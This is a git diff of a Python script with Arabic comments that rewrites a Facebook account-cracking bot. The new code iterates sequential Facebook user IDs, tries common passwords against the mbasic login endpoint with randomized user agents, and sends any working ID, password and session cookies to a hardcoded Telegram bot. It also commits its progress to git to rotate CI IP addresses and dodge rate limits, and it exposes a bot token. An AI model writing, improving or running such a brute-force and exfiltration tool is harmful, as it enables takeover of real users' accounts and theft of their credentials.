@@ -1,90 +1,79 @@
-import time
-import random
 import requests
+import random
+import time
 import os
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.common.by import By
-from webdriver_manager.chrome import ChromeDriverManager
-from selenium.webdriver.common.action_chains import ActionChains
+import subprocess
 
 # 🔑 إعدادات تليجرام
 TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
 CHAT_ID = "5653032481"
 
-PASS_LIST = ['123456', '12345678', 'jasser123', 'malo123', '11223344'] # قائمة تجريبية (زدها لاحقاً)
+PROGRESS_FILE = "progress.txt"
+
+def get_last_id():
+    if os.path.exists(PROGRESS_FILE):
+        with open(PROGRESS_FILE, "r") as f:
+            line = f.read().strip()
+            if line: return int(line)
+    return 26701173
+
+def save_progress(current_id):
+    with open(PROGRESS_FILE, "w") as f:
+        f.write(str(current_id))
 
 def send_to_tg(text):
     try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
     except: pass
 
-def send_photo_tg(photo_path, caption):
+def get_current_ip():
+    try: return requests.get('https://api.ipify.org', timeout=5).text
+    except: return "Unknown"
+
+def check_fb(uid, pas):
+    uas = [
+        f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-A{random.randint(100,700)}F)",
+        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16,17)}_1 like Mac OS X)",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    ]
+    headers = {'User-Agent': random.choice(uas)}
     try:
-        with open(photo_path, 'rb') as photo:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
-                          data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})
+        url = "https://mbasic.facebook.com/login/device-based/regular/login/"
+        data = {"email": uid, "pass": pas, "login": "Log In"}
+        res = requests.post(url, data=data, headers=headers, timeout=7)
+        
+        if "c_user" in res.cookies:
+            ck = "; ".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])
+            send_to_tg(f"✅ تم الصيد (OK)\n🆔: {uid}\n🔑: {pas}\n🍪: {ck}")
+            return True
+        elif "checkpoint" in res.url:
+            send_to_tg(f"⚠️ مقفل (CP)\n🆔: {uid}\n🔑: {pas}")
+            return True
     except: pass
+    return False
 
-def check_account(uid, send_img=True):
-    options = Options()
-    options.add_argument('--headless')
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-    options.add_argument('--window-size=1920,1080')
+def restart_session():
+    subprocess.run("git config --global user.name 'jasser'", shell=True)
+    subprocess.run("git config --global user.email 'jasser@example.com'", shell=True)
+    subprocess.run("git add progress.txt", shell=True)
+    subprocess.run("git commit -m '🔄 IP Rotation'", shell=True)
+    subprocess.run("git push origin main", shell=True)
+    exit()
+
+def run_main():
+    last_id = get_last_id()
+    batch_size = 10 
+    current_ip = get_current_ip()
     
-    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
-    actions = ActionChains(driver)
-    
-    try:
-        for pas in PASS_LIST:
-            driver.get("https://www.facebook.com")
-            time.sleep(5)
-            
-            # إدخال البيانات
-            email_field = driver.find_element(By.NAME, "email")
-            pass_field = driver.find_element(By.NAME, "pass")
-            
-            email_field.send_keys(uid)
-            time.sleep(1)
-            pass_field.send_keys(pas)
-            time.sleep(1)
+    # 📢 رسالة بدء السكربت
+    send_to_tg(f"🚀 بدأ السكربت الآن..\n📍 فحص الحسابات من: {last_id}\n🌐 IP الحالي: {current_ip}\n🔢 الكمية: {batch_size} حسابات في هذه الدورة")
 
-            # --- محاكاة ضغط بشرية احترافية ---
-            try:
-                login_btn = driver.find_element(By.NAME, "login")
-                # التحرك للزر ثم الضغط
-                actions.move_to_element(login_btn).click().perform()
-            except:
-                # إذا فشل، نستخدم الضغط البرمجي المباشر كحل أخير
-                driver.execute_script("document.querySelector('button[name=\"login\"]').click();")
-            
-            time.sleep(8) # انتظار طويل للتأكد من التحميل
-            
-            if send_img:
-                img_name = f"after_{uid}.png"
-                driver.save_screenshot(img_name)
-                send_photo_tg(img_name, f"📸 لقطة بعد محاولة الضغط لـ: {uid}")
-                os.remove(img_name)
-                send_img = False # صورة واحدة كافية للتأكد
-
-            # التحقق من النتائج
-            cookies = driver.get_cookies()
-            if any(c['name'] == 'c_user' for c in cookies):
-                send_to_tg(f"✅ تم الصيد بنجاح (OK)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
-                break
-            elif "checkpoint" in driver.current_url:
-                send_to_tg(f"⚠️ حساب مقفل (CP)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
-                break
-                
-    except Exception as e:
-        print(f"Error: {e}")
-    finally:
-        driver.quit()
+    for i in range(batch_size):
+        current_id = last_id + i
+        for pas in ['123456', '12345678', 'jasser123', 'malo123', '00000000']:
+            check_fb(str(current_id), pas)
+        
+    save_progress(last_id + batch_size)
+    restart_session()
 
 if __name__ == "__main__":
-    send_to_tg("🚀 تفعيل نظام الضغط البشري (V64).. بدأ الفحص.")
-    # فحص أول حسابين للتأكد من الضغط
-    ids = [str(26701173 + i) for i in range(200)]
-    for i in range(2): 
-        check_account(ids[i], send_img=True)
+    run_main()
